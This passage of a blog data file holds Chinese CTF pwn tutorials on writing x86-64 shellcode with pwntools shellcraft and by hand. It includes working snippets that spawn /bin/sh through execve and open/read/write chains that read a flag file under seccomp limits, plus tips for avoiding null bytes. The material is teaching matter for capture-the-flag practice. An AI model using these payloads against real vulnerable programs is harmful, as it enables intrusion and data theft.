`shellcraft.sh()`**，最快起 shell。\n* **禁 59 → 走 orw**：优先 `shellcraft.cat(\"./flag\")`；`open` 被禁就换 `openat`；再不行找 **已存在 fd** 或 `sendfile`。\n* 熟悉 `pushstr` 的用法，你就能自由拼接口参数，快速写出自定义 syscall 组合。\n\n","slug":"Day 03 shellcode之：板子做pwn,易如反掌","published":1,"updated":"2025-09-22T06:13:41.825Z","_id":"cmew8u8s00000uot89nezhdim","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"shellcraft杂谈\"><a href=\"#shellcraft杂谈\" class=\"headerlink\" title=\"shellcraft杂谈\"></a>shellcraft杂谈</h1><h2 id=\"1-什么时候考虑写-shellcode？\"><a href=\"#1-什么时候考虑写-shellcode？\" class=\"headerlink\" title=\"1. 什么时候考虑写 shellcode？\"></a>1. 什么时候考虑写 shellcode？</h2><p>在 pwn 题里，是否写 shellcode一般要看是否能满足以下条件：</p>\n<p><strong>能把<em>可控字节</em>放进一块<em>可执行内存</em></strong>：如程序把输入放到栈&#x2F;堆且该段 <strong>可执行（NX 关闭）</strong>；或能把内存权限改为可执行（有<code>mprotect</code>, <code>mmap</code>函数）。</p>\n<p>所以写入shellcode前要先<em>检查</em>一下，确保shellcode写入到<strong>可执行内存</strong>中。<br>若以上条件不满足，更适合探索其他路线。</p>\n<hr>\n<h2 id=\"2-shellcraft-的三个常用组件\"><a href=\"#2-shellcraft-的三个常用组件\" class=\"headerlink\" title=\"2.  shellcraft 的三个常用组件\"></a>2.  <code>shellcraft</code> 的三个常用组件</h2><p> <code>shellcraft</code> 是<code>pwntools</code> 里的一个模块（<strong>板子</strong>），会根据体系结构生成汇编片段。以下均以x64架构为例。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-shellcraft-sh\"><a href=\"#2-1-shellcraft-sh\" class=\"headerlink\" title=\"2.1 shellcraft.sh()\"></a>2.1 <code>shellcraft.sh()</code></h3><ul>\n<li>作用：构造执行 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 的 shellcode。</li>\n<li>适用：<strong>允许 59 号系统调用</strong>、无 seccomp 限制。</li>\n<li>用法示例：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode = shellcraft.sh()          <span class=\"comment\"># execve(&quot;/bin/sh&quot;, NULL, NULL)</span></span><br><span class=\"line\"><span class=\"comment\"># asm()函数将汇编翻译成机器码，shellcode都需要转换成机器码再写入内存：</span></span><br><span class=\"line\"> payload = asm(shellcode)    <span class=\"comment\"># 这句默认都需要，下面就不写了</span></span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"2-2-shellcraft-pushstr\"><a href=\"#2-2-shellcraft-pushstr\" class=\"headerlink\" title=\"2.2 shellcraft.pushstr()\"></a>2.2 <code>shellcraft.pushstr()</code></h3><ul>\n<li>作用：把一个以 <code>\\x00</code> 结尾的字符串压到栈上，再作为系统调用参数。</li>\n<li>典型写法：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode = shellcraft.pushstr(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>)  <span class=\"comment\"># 把字符串压栈，rsp 指向它</span></span><br><span class=\"line\">shellcode += shellcraft.mov(<span class=\"string\">&#x27;rdi&#x27;</span>, <span class=\"string\">&#x27;rsp&#x27;</span>)        <span class=\"comment\"># rdi = 指向 &quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>对应汇编：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push <span class=\"number\">0x0068732f6e69622f</span>   ; <span class=\"string\">&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\">mov rdi, rsp 或者 pop rdi    ; rdi 指向栈顶的字符串</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-shellcraft-cat-flag\"><a href=\"#2-3-shellcraft-cat-flag\" class=\"headerlink\" title=\"2.3 shellcraft.cat(&quot;./flag&quot;)\"></a>2.3 <code>shellcraft.cat(&quot;./flag&quot;)</code></h3><ul>\n<li>作用：禁用59号execve()系统调用时，一条龙 <strong>打开文件→读→写到 stdout</strong>，非常适合作为 <strong>orw</strong> 的快捷实现（open-&gt;read-&gt;write）。</li>\n<li>用法示例：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc = shellcraft.cat(<span class=\"string\">&quot;./flag&quot;</span>)   <span class=\"comment\"># open(&quot;./flag&quot;, O); read(); write(1, buf, 0x50)</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>优点：不用自己管缓冲区循环，能快速验证 orw 思路。</li>\n<li>注意：若沙箱禁了 <code>open</code> 而只放行 <code>openat</code>，需要改用 <code>shellcraft.openat(...)</code> 或手写 syscall。</li>\n</ul>\n<hr>\n<h2 id=\"3-orw（open-read-write）汇编实现：\"><a href=\"#3-orw（open-read-write）汇编实现：\" class=\"headerlink\" title=\"3. orw（open&#x2F;read&#x2F;write）汇编实现：\"></a>3. orw（open&#x2F;read&#x2F;write）汇编实现：</h2><h3 id=\"前置芝士：😋\"><a href=\"#前置芝士：😋\" class=\"headerlink\" title=\"前置芝士：😋\"></a>前置芝士：😋</h3><ul>\n<li>关于文件描述符（句柄）：<ul>\n<li>文件描述符是一个非负整数，用于标识一个打开的文件或其他输入输出资源。</li>\n<li>每个进程都有自己的文件描述符表，记录着所有打开文件的信息。</li>\n<li>文件描述符从 0 开始分配，通常 0、1、2 分别对应标准输入、标准输出和标准错误输出。</li>\n</ul>\n</li>\n<li>关于库函数：<ul>\n<li><code>open（file,mode）</code>: 以mode模式打开file文件（带路径），返回文件描述符。<br>mode: 0-&gt;只读、1-&gt;只写、2-&gt;读写。</li>\n<li><code>read（fd,buf,count）</code>: 从文件描述符 fd 读取数据到 buf，最多读取 count 字节。</li>\n<li><code>write（fd,buf,count）</code>: 向文件描述符 fd 写入 buf 中的数据，最多写 count 字节。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"orw实现：\"><a href=\"#orw实现：\" class=\"headerlink\" title=\"orw实现：\"></a>orw实现：</h3><ul>\n<li><p>当 <strong>59（<code>execve</code>）被禁</strong>，<code>/bin/sh</code> 起不来，就走文件读写：</p>\n<ol>\n<li><strong>open &#x2F; openat</strong> 打开 <code>./flag</code>（或题目指定路径），获得 fd。</li>\n<li><strong>read</strong> 把内容读到可控缓冲区（通常是栈上，rsp）。</li>\n<li><strong>write</strong> 把缓冲区写到 <code>stdout</code>（fd&#x3D;1）返回给我们。</li>\n</ol>\n</li>\n<li><p>exp：</p>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode =asm(shellcraft.pushstr(<span class=\"string\">&quot;./flag&quot;</span>)+<span class=\"string\">&quot;mov rdi,rsp;push 2;pop rax;xor rsi,rsi;syscall&quot;</span>)<span class=\"comment\">#open</span></span><br><span class=\"line\">shellcode+=asm(<span class=\"string\">&quot;mov rdi,rax&quot;</span>)<span class=\"comment\">#将返回值放入read的一参数</span></span><br><span class=\"line\">shellcode+=asm(<span class=\"string\">&quot;mov rsi,rsp;push 0x50;pop rdx;push 0;pop rax;syscall&quot;</span>)<span class=\"comment\">#read</span></span><br><span class=\"line\">shellcode+=asm(<span class=\"string\">&quot;push 1;pop rax;push 1;pop rdi;syscall&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>因为不同题目的限制不一样，shellcraft可能不适用，所以建议各位大爹手写汇编🥰</p>\n<h2 id=\"4-如果常用的被禁了😭\"><a href=\"#4-如果常用的被禁了😭\" class=\"headerlink\" title=\"4. 如果常用的被禁了😭\"></a>4. 如果常用的被禁了😭</h2><p><code>open</code> 被禁但 <strong><code>openat</code>(257)</strong> 可用，使用<code>shellcraft.openat</code></p>\n<p> <code>read</code>被禁了用<code>sendfile</code> ，把 <code>flag</code> 直接送到 <code>stdout</code>。</p>\n<hr>\n<h2 id=\"5-调试与实战小贴士\"><a href=\"#5-调试与实战小贴士\" class=\"headerlink\" title=\"5. 调试与实战小贴士\"></a>5. 调试与实战小贴士</h2><ul>\n<li><p><strong>先本地跑</strong>：用 <code>process()</code> + <code>gdb.attach()</code>；看 seccomp（如题给 <code>seccomp-tools</code> 的输出）到底放了哪些 syscall。</p>\n</li>\n<li><p><strong>RWX 获取</strong>：NX 开着就用 ROP 先 <code>mmap</code>&#x2F;<code>mprotect</code></p>\n</li>\n<li><p><strong>极简 loader</strong>：若输入长度受限，先丢一个 “读更多字节到某地址再跳转” 的小 loader，然后把完整 orw shellcode 流进去。</p>\n</li>\n</ul>\n<hr>\n<h2 id=\"6-小结（拿题就能套）\"><a href=\"#6-小结（拿题就能套）\" class=\"headerlink\" title=\"6. 小结（拿题就能套）\"></a>6. 小结（拿题就能套）</h2><ul>\n<li><strong>能 <code>execve</code> → <code>shellcraft.sh()</code></strong>，最快起 shell。</li>\n<li><strong>禁 59 → 走 orw</strong>：优先 <code>shellcraft.cat(&quot;./flag&quot;)</code>；<code>open</code> 被禁就换 <code>openat</code>；再不行找 <strong>已存在 fd</strong> 或 <code>sendfile</code>。</li>\n<li>熟悉 <code>pushstr</code> 的用法，你就能自由拼接口参数，快速写出自定义 syscall 组合。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"shellcraft杂谈\"><a href=\"#shellcraft杂谈\" class=\"headerlink\" title=\"shellcraft杂谈\"></a>shellcraft杂谈</h1><h2 id=\"1-什么时候考虑写-shellcode？\"><a href=\"#1-什么时候考虑写-shellcode？\" class=\"headerlink\" title=\"1. 什么时候考虑写 shellcode？\"></a>1. 什么时候考虑写 shellcode？</h2><p>在 pwn 题里，是否写 shellcode一般要看是否能满足以下条件：</p>\n<p><strong>能把<em>可控字节</em>放进一块<em>可执行内存</em></strong>：如程序把输入放到栈&#x2F;堆且该段 <strong>可执行（NX 关闭）</strong>；或能把内存权限改为可执行（有<code>mprotect</code>, <code>mmap</code>函数）。</p>\n<p>所以写入shellcode前要先<em>检查</em>一下，确保shellcode写入到<strong>可执行内存</strong>中。<br>若以上条件不满足，更适合探索其他路线。</p>\n<hr>\n<h2 id=\"2-shellcraft-的三个常用组件\"><a href=\"#2-shellcraft-的三个常用组件\" class=\"headerlink\" title=\"2.  shellcraft 的三个常用组件\"></a>2.  <code>shellcraft</code> 的三个常用组件</h2><p> <code>shellcraft</code> 是<code>pwntools</code> 里的一个模块（<strong>板子</strong>），会根据体系结构生成汇编片段。以下均以x64架构为例。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-shellcraft-sh\"><a href=\"#2-1-shellcraft-sh\" class=\"headerlink\" title=\"2.1 shellcraft.sh()\"></a>2.1 <code>shellcraft.sh()</code></h3><ul>\n<li>作用：构造执行 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 的 shellcode。</li>\n<li>适用：<strong>允许 59 号系统调用</strong>、无 seccomp 限制。</li>\n<li>用法示例：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode = shellcraft.sh()          <span class=\"comment\"># execve(&quot;/bin/sh&quot;, NULL, NULL)</span></span><br><span class=\"line\"><span class=\"comment\"># asm()函数将汇编翻译成机器码，shellcode都需要转换成机器码再写入内存：</span></span><br><span class=\"line\"> payload = asm(shellcode)    <span class=\"comment\"># 这句默认都需要，下面就不写了</span></span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"2-2-shellcraft-pushstr\"><a href=\"#2-2-shellcraft-pushstr\" class=\"headerlink\" title=\"2.2 shellcraft.pushstr()\"></a>2.2 <code>shellcraft.pushstr()</code></h3><ul>\n<li>作用：把一个以 <code>\\x00</code> 结尾的字符串压到栈上，再作为系统调用参数。</li>\n<li>典型写法：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode = shellcraft.pushstr(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>)  <span class=\"comment\"># 把字符串压栈，rsp 指向它</span></span><br><span class=\"line\">shellcode += shellcraft.mov(<span class=\"string\">&#x27;rdi&#x27;</span>, <span class=\"string\">&#x27;rsp&#x27;</span>)        <span class=\"comment\"># rdi = 指向 &quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>对应汇编：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push <span class=\"number\">0x0068732f6e69622f</span>   ; <span class=\"string\">&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\">mov rdi, rsp 或者 pop rdi    ; rdi 指向栈顶的字符串</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-shellcraft-cat-flag\"><a href=\"#2-3-shellcraft-cat-flag\" class=\"headerlink\" title=\"2.3 shellcraft.cat(&quot;./flag&quot;)\"></a>2.3 <code>shellcraft.cat(&quot;./flag&quot;)</code></h3><ul>\n<li>作用：禁用59号execve()系统调用时，一条龙 <strong>打开文件→读→写到 stdout</strong>，非常适合作为 <strong>orw</strong> 的快捷实现（open-&gt;read-&gt;write）。</li>\n<li>用法示例：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc = shellcraft.cat(<span class=\"string\">&quot;./flag&quot;</span>)   <span class=\"comment\"># open(&quot;./flag&quot;, O); read(); write(1, buf, 0x50)</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>优点：不用自己管缓冲区循环，能快速验证 orw 思路。</li>\n<li>注意：若沙箱禁了 <code>open</code> 而只放行 <code>openat</code>，需要改用 <code>shellcraft.openat(...)</code> 或手写 syscall。</li>\n</ul>\n<hr>\n<h2 id=\"3-orw（open-read-write）汇编实现：\"><a href=\"#3-orw（open-read-write）汇编实现：\" class=\"headerlink\" title=\"3. orw（open&#x2F;read&#x2F;write）汇编实现：\"></a>3. orw（open&#x2F;read&#x2F;write）汇编实现：</h2><h3 id=\"前置芝士：😋\"><a href=\"#前置芝士：😋\" class=\"headerlink\" title=\"前置芝士：😋\"></a>前置芝士：😋</h3><ul>\n<li>关于文件描述符（句柄）：<ul>\n<li>文件描述符是一个非负整数，用于标识一个打开的文件或其他输入输出资源。</li>\n<li>每个进程都有自己的文件描述符表，记录着所有打开文件的信息。</li>\n<li>文件描述符从 0 开始分配，通常 0、1、2 分别对应标准输入、标准输出和标准错误输出。</li>\n</ul>\n</li>\n<li>关于库函数：<ul>\n<li><code>open（file,mode）</code>: 以mode模式打开file文件（带路径），返回文件描述符。<br>mode: 0-&gt;只读、1-&gt;只写、2-&gt;读写。</li>\n<li><code>read（fd,buf,count）</code>: 从文件描述符 fd 读取数据到 buf，最多读取 count 字节。</li>\n<li><code>write（fd,buf,count）</code>: 向文件描述符 fd 写入 buf 中的数据，最多写 count 字节。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"orw实现：\"><a href=\"#orw实现：\" class=\"headerlink\" title=\"orw实现：\"></a>orw实现：</h3><ul>\n<li><p>当 <strong>59（<code>execve</code>）被禁</strong>，<code>/bin/sh</code> 起不来，就走文件读写：</p>\n<ol>\n<li><strong>open &#x2F; openat</strong> 打开 <code>./flag</code>（或题目指定路径），获得 fd。</li>\n<li><strong>read</strong> 把内容读到可控缓冲区（通常是栈上，rsp）。</li>\n<li><strong>write</strong> 把缓冲区写到 <code>stdout</code>（fd&#x3D;1）返回给我们。</li>\n</ol>\n</li>\n<li><p>exp：</p>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode =asm(shellcraft.pushstr(<span class=\"string\">&quot;./flag&quot;</span>)+<span class=\"string\">&quot;mov rdi,rsp;push 2;pop rax;xor rsi,rsi;syscall&quot;</span>)<span class=\"comment\">#open</span></span><br><span class=\"line\">shellcode+=asm(<span class=\"string\">&quot;mov rdi,rax&quot;</span>)<span class=\"comment\">#将返回值放入read的一参数</span></span><br><span class=\"line\">shellcode+=asm(<span class=\"string\">&quot;mov rsi,rsp;push 0x50;pop rdx;push 0;pop rax;syscall&quot;</span>)<span class=\"comment\">#read</span></span><br><span class=\"line\">shellcode+=asm(<span class=\"string\">&quot;push 1;pop rax;push 1;pop rdi;syscall&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>因为不同题目的限制不一样，shellcraft可能不适用，所以建议各位大爹手写汇编🥰</p>\n<h2 id=\"4-如果常用的被禁了😭\"><a href=\"#4-如果常用的被禁了😭\" class=\"headerlink\" title=\"4. 如果常用的被禁了😭\"></a>4. 如果常用的被禁了😭</h2><p><code>open</code> 被禁但 <strong><code>openat</code>(257)</strong> 可用，使用<code>shellcraft.openat</code></p>\n<p> <code>read</code>被禁了用<code>sendfile</code> ，把 <code>flag</code> 直接送到 <code>stdout</code>。</p>\n<hr>\n<h2 id=\"5-调试与实战小贴士\"><a href=\"#5-调试与实战小贴士\" class=\"headerlink\" title=\"5. 调试与实战小贴士\"></a>5. 调试与实战小贴士</h2><ul>\n<li><p><strong>先本地跑</strong>：用 <code>process()</code> + <code>gdb.attach()</code>；看 seccomp（如题给 <code>seccomp-tools</code> 的输出）到底放了哪些 syscall。</p>\n</li>\n<li><p><strong>RWX 获取</strong>：NX 开着就用 ROP 先 <code>mmap</code>&#x2F;<code>mprotect</code></p>\n</li>\n<li><p><strong>极简 loader</strong>：若输入长度受限，先丢一个 “读更多字节到某地址再跳转” 的小 loader，然后把完整 orw shellcode 流进去。</p>\n</li>\n</ul>\n<hr>\n<h2 id=\"6-小结（拿题就能套）\"><a href=\"#6-小结（拿题就能套）\" class=\"headerlink\" title=\"6. 小结（拿题就能套）\"></a>6. 小结（拿题就能套）</h2><ul>\n<li><strong>能 <code>execve</code> → <code>shellcraft.sh()</code></strong>，最快起 shell。</li>\n<li><strong>禁 59 → 走 orw</strong>：优先 <code>shellcraft.cat(&quot;./flag&quot;)</code>；<code>open</code> 被禁就换 <code>openat</code>；再不行找 <strong>已存在 fd</strong> 或 <code>sendfile</code>。</li>\n<li>熟悉 <code>pushstr</code> 的用法，你就能自由拼接口参数，快速写出自定义 syscall 组合。</li>\n</ul>\n"},{"title":"Day 04 shellcode之手写汇编小tips","date":"2025-08-29T16:00:00.000Z","top_img":"/images/background/狐妖/03.jpg","cover":"/images/background/狐妖/2.jpg","_content":"\n# Shellcode 汇编小 Tips\n\n如果shellcraft不适用，我们往往需要手写汇编构造更简短的 shellcode。本文整理了一些小技巧，帮助你快速写出合适的 shellcode。\n\n---\n## 前置知识\n###  1.mmap 与可执行内存\n\n有些题目会先用 `mmap` 给我们一块可读可写可执行的内存，比如：\n```c\nsecret = (__int64)mmap((void *)0x111000, 0x1000uLL, 7, 34, -1, 0LL);\n```\n\n* 第一参数：映射地址（0 表示随机，>0x10000 时映射到自己）\n* 第二参数：长度\n* 第三参数：保护权限（7 = r + w + x=1+2+4）\n* 第五参数：文件句柄（-1 表示匿名）\n\n我们就可以把 **shellcode** 写入到这片内存里并**执行**。\n\n---\n\n### 2. 常见 syscall 编号\n\nLinux x64 下，常用的系统调用号：\n\n* `read`  = 0\n* `write` = 1\n* `open`  = 2\n* `execve` = 59 (0x3b)\n\n执行系统调用的一般步骤：\n\n```asm\nmov rax, <syscall号>   ; 系统调用号放在 rax\nmov rdi, <参数1>\nmov rsi, <参数2>\nmov rdx, <参数3>\nsyscall\n```\n\n比如执行 `/bin/sh`：\n\n```asm\nexecve(\"/bin/sh\", 0, 0)\n```\n\n对应寄存器：\n\n* `rax = 59`\n* `rdi = \"/bin/sh\"`\n* `rsi = 0`\n* `rdx = 0`   \n\n**对应汇编**：\n```asm\nshellcode=\"mov rsi,0;mov rdx,0;mov rax,59;push 0x68732f6e69622f;pop rdi;syscall\"\n```\n---\n\n### 3. asm()函数\n\npwntools 提供了 `asm()` 快速把汇编翻译成字节码：\n\n```python\nshellcode=asm(shellcode)\n```\n\n\n\n---\n\n## 小tips\n\n### 1. 绕过字符串检测（strlen 等）---> **push 0;**\n\n有些题目会检测输入的字符串，如果包含 `\\x00` 截断（如 `strlen`），可以利用`push 0` 在栈上手动压入空字符，避免直接输入 `\\x00`（这个会导致你写入的目标汇编被截成其他无效汇编，执行不可知的操作）：\n\n```asm\npush 0              ; 压入 \\x00\nmov rsi, rsp\n```\n\n这样就能通过可打印字符串的检验了。\n\n---\n\n### 2.没有`/bin/sh`  --->写入`/bin/sh`到映射的内存中\n`.ljust()`函数：用二参向右填充满一参字节，不会覆盖原有数据。\n\n```python  \nshellcode.ljust(0x50,b\"\\x00\")+b\"/bin/sh\\x00\" \n```\n此时`/bin/sh`的地址就是`0x111050`（假设映射地址是`0x111000`），`mov rdi, 0x111050`即可。\n\n\n---\n### 3.mov 消耗过大 ---> **push + pop**\n如`mov rsi,0;`可以用`push 0; pop rsi;`代替，节省字节数。\n\n---\n### 4.翻译汇编的网站\n可以使用 [https://defuse.ca/online-x86-assembler.htm](https://defuse.ca/online-x86-assembler.htm) 这个网站把汇编代码翻译成机器码。   \n师傅们可以使用这个工具来调试和优化自己的 shellcode。\n\n---\n##  总结\n\n* **mmap** 常用于获取一片可执行内存，用来写 shellcode。\n* **syscall 编号** 可以记一下，尤其是 read/write/open/execve。\n* 写字符串时注意 `\\x00` 截断问题，必要时用 `push 0；` 手动补。\n* `mov` 指令有时过长，可以用 `push + pop` 代替。\n\n\n---\n\n","source":"_posts/Day 04 shellcode之手写汇编小tips.md","raw":"---\ntitle: Day 04 shellcode之手写汇编小tips\ndate: 2025-08-30\ntags:\n  - 汇编\n  - pwntools\n  - ubuntu\ncategories: pwn\ntop_img: /images/background/狐妖/03.jpg\ncover: /images/background/狐妖/2.jpg\n---\n\n# Shellcode 汇编小 Tips\n\n如果shellcraft不适用，我们往往需要手写汇编构造更简短的 shellcode。本文整理了一些小技巧，帮助你快速写出合适的 shellcode。\n\n---\n## 前置知识\n###  1.mmap 与可执行内存\n\n有些题目会先用 `mmap` 给我们一块可读可写可执行的内存，比如：\n```c\nsecret = (__int64)mmap((void *)0x111000, 0x1000uLL, 7, 34, -1, 0LL);\n```\n\n* 第一参数：映射地址（0 表示随机，>0x10000 时映射到自己）\n* 第二参数：长度\n* 第三参数：保护权限（7 = r + w + x=1+2+4）\n* 第五参数：文件句柄（-1 表示匿名）\n\n我们就可以把 **shellcode** 写入到这片内存里并**执行**。\n\n---\n\n### 2. 常见 syscall 编号\n\nLinux x64 下，常用的系统调用号：\n\n* `read`  = 0\n* `write` = 1\n* `open`  = 2\n* `execve` = 59 (0x3b)\n\n执行系统调用的一般步骤：\n\n```asm\nmov rax, <syscall号>   ; 系统调用号放在 rax\nmov rdi, <参数1>\nmov rsi, <参数2>\nmov rdx, <参数3>\nsyscall\n```\n\n比如执行 `/bin/sh`：\n\n```asm\nexecve(\"/bin/sh\", 0, 0)\n```\n\n对应寄存器：\n\n* `rax = 59`\n* `rdi = \"/bin/sh\"`\n* `rsi = 0`\n* `rdx = 0`   \n\n**对应汇编**：\n```asm\nshellcode=\"mov rsi,0;mov rdx,0;mov rax,59;push 0x68732f6e69622f;pop rdi;syscall\"\n```\n---\n\n### 3. asm()函数\n\npwntools 提供了 `asm()` 快速把汇编翻译成字节码：\n\n```python\nshellcode=asm(shellcode)\n```\n\n\n\n---\n\n## 小tips\n\n### 1. 绕过字符串检测（strlen 等）---> **push 0;**\n\n有些题目会检测输入的字符串，如果包含 `\\x00` 截断（如 `strlen`），可以利用`push 0` 在栈上手动压入空字符，避免直接输入 `\\x00`（这个会导致你写入的目标汇编被截成其他无效汇编，执行不可知的操作）：\n\n```asm\npush 0              ; 压入 \\x00\nmov rsi, rsp\n```\n\n这样就能通过可打印字符串的检验了。\n\n---\n\n### 2.没有`/bin/sh`  --->写入`/bin/sh`到映射的内存中\n`.ljust()`函数：用二参向右填充满一参字节，不会覆盖原有数据。\n\n```python  \nshellcode.ljust(0x50,b\"\\x00\")+b\"/bin/sh\\x00\" \n```\n此时`/bin/sh`的地址就是`0x111050`（假设映射地址是`0x111000`），`mov rdi, 0x111050`即可。\n\n\n---\n### 3.mov 消耗过大 ---> **push + pop**\n如`mov rsi,0;`可以用`push 0; pop rsi;`代替，节省字节数。\n\n---\n### 4.翻译汇编的网站\n可以使用 [https://defuse.ca/online-x86-assembler.htm](https://defuse.ca/online-x86-assembler.htm) 这个网站把汇编代码翻译成机器码。   \n师傅们可以使用这个工具来调试和优化自己的 shellcode。\n\n---\n##  总结\n\n* **mmap** 常用于获取一片可执行内存，用来写 shellcode。\n* **syscall 编号** 可以记一下，尤其是 read/write/open/execve。\n* 写字符串时注意 `\\x00` 截断问题，必要时用 `push 0；` 手动补。\n* `mov` 指令有时过长，可以用 `push + pop` 代替。\n\n\n---\n\n","slug":"Day 04 shellcode之手写汇编小tips","published":1,"updated":"2025-09-22T06:15:57.089Z","_id":"cmexna49i0000h4t81t4dfb9k","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"Shellcode-汇编小-Tips\"><a href=\"#Shellcode-汇编小-Tips\" class=\"headerlink\" title=\"Shellcode 汇编小 Tips\"></a>Shellcode 汇编小 Tips</h1><p>如果shellcraft不适用，我们往往需要手写汇编构造更简短的 shellcode。本文整理了一些小技巧，帮助你快速写出合适的 shellcode。</p>\n<hr>\n<h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><h3 id=\"1-mmap-与可执行内存\"><a href=\"#1-mmap-与可执行内存\" class=\"headerlink\" title=\"1.mmap 与可执行内存\"></a>1.mmap 与可执行内存</h3><p>有些题目会先用 <code>mmap</code> 给我们一块可读可写可执行的内存，比如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secret = (__int64)mmap((<span class=\"type\">void</span> *)<span class=\"number\">0x111000</span>, <span class=\"number\">0x1000u</span>LL, <span class=\"number\">7</span>, <span class=\"number\">34</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>第一参数：映射地址（0 表示随机，&gt;0x10000 时映射到自己）</li>\n<li>第二参数：长度</li>\n<li>第三参数：保护权限（7 &#x3D; r + w + x&#x3D;1+2+4）</li>\n<li>第五参数：文件句柄（-1 表示匿名）</li>\n</ul>\n<p>我们就可以把 <strong>shellcode</strong> 写入到这片内存里并<strong>执行</strong>。</p>\n<hr>\n<h3 id=\"2-常见-syscall-编号\"><a href=\"#2-常见-syscall-编号\" class=\"headerlink\" title=\"2. 常见 syscall 编号\"></a>2. 常见 syscall 编号</h3><p>Linux x64 下，常用的系统调用号：</p>\n<ul>\n<li><code>read</code>  &#x3D; 0</li>\n<li><code>write</code> &#x3D; 1</li>\n<li><code>open</code>  &#x3D; 2</li>\n<li><code>execve</code> &#x3D; 59 (0x3b)</li>\n</ul>\n<p>执行系统调用的一般步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov rax, &lt;syscall号&gt;   ; 系统调用号放在 rax</span><br><span class=\"line\">mov rdi, &lt;参数1&gt;</span><br><span class=\"line\">mov rsi, &lt;参数2&gt;</span><br><span class=\"line\">mov rdx, &lt;参数3&gt;</span><br><span class=\"line\">syscall</span><br></pre></td></tr></table></figure>\n\n<p>比如执行 <code>/bin/sh</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">execve(&quot;/bin/sh&quot;, 0, 0)</span><br></pre></td></tr></table></figure>\n\n<p>对应寄存器：</p>\n<ul>\n<li><code>rax = 59</code></li>\n<li><code>rdi = &quot;/bin/sh&quot;</code></li>\n<li><code>rsi = 0</code></li>\n<li><code>rdx = 0</code></li>\n</ul>\n<p><strong>对应汇编</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode=&quot;mov rsi,0;mov rdx,0;mov rax,59;push 